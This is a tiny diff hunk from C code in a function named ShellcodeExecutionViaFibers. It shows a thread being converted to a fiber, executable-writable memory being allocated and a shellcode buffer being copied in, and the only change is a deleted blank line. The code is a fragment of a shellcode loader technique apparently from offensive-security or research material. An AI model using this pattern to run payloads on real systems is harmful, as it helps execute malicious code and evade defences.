@@ -62,7 +62,6 @@ void ShellcodeExecutionViaFibers() {
 	//convert main thread to fiber
 	PVOID mainFiber = ConvertThreadToFiber(NULL);
 
-
 	PVOID shellcodeLocation = VirtualAlloc(0, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	//WriteProcessMemory(GetCurrentProcess(), shellcodeLocation, shellCode, shellSize, NULL);
 	memcpy(shellcodeLocation, shellCode, shellSize);
